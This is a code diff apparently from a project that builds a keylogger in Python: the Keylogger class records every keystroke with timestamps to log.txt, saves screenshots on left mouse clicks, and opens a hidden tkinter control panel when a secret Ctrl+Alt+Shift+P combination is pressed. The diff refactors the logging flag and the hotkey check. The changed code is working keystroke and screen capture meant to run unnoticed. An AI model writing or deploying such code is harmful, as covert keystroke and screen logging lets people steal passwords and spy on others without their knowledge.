@@ -1,12 +1,18 @@
-import pynput
-from pynput.mouse import Button as MouseButton
-from pynput.keyboard import Key, KeyCode
-import time
-from datetime import datetime as date
-from PIL import ImageGrab
 import os
 import re
+import time
+import tkinter as tk
+# from cmath import log
+from datetime import datetime as date
 from threading import Thread
+
+import pynput
+from PIL import ImageGrab
+from pynput.keyboard import Key
+from pynput.mouse import Button as MouseButton
+
+from ui import Application
+
 
 class Keylogger():
     def __init__(self, logging):
@@ -16,7 +22,7 @@ class Keylogger():
     def initial(self):
         self.current_time = time.time()
         self.current_combination = set()
-        self.COMBINATION = {KeyCode(vk=80), Key.alt_l, Key.shift_l, Key.ctrl_l}
+        self.COMBINATION = {"<80>", Key.alt_l, Key.shift_l, Key.ctrl_l}
         with open('log.txt', "a") as f:
             f.write('\n' + str(date.now()) + '-->')
 
@@ -37,11 +43,11 @@ class Keylogger():
     def write_file(self, key):
         with open('log.txt', "a") as f:
             self.check_combination(key)
-            # if logging:
-            k = self.get_key_ready_for_print(key)
-            if self.current_time + 59.9 <= time.time():
-                self.log_time(f)
-            f.write(k)
+            if self.logging:
+                k = self.get_key_ready_for_print(key)
+                if self.current_time + 59.9 <= time.time():
+                    self.log_time(f)
+                f.write(k)
 
     def get_key_ready_for_print(self, key):
 
@@ -73,13 +79,20 @@ class Keylogger():
         return k
 
     def check_combination(self, key):
-        global logging
+        if (str(key) == "<80>"):
+            key = str(key)
+
         if key in self.COMBINATION:
             self.current_combination.add(key)
             if all(k in self.current_combination for k in self.COMBINATION):
                 self.current_combination = set()
-                application = Thread(name='Application', target=start_app)
+                application = Thread(name='Application', target=self.open_ui)
                 application.start()
+
+    def open_ui(self):
+        root = tk.Tk()
+        app = Application(self.logging, master=root)
+        app.mainloop()
 
     def log_time(self, f):
         f.write('\n' + str(date.now()) + '-->')
@@ -97,5 +110,5 @@ class Keylogger():
         snapshot.save(save_path)
 
     def on_click(self, x, y, button, pressed):
-        if button == MouseButton.left and pressed and logging:
+        if button == MouseButton.left and pressed and self.logging:
             self.take_screenshot()
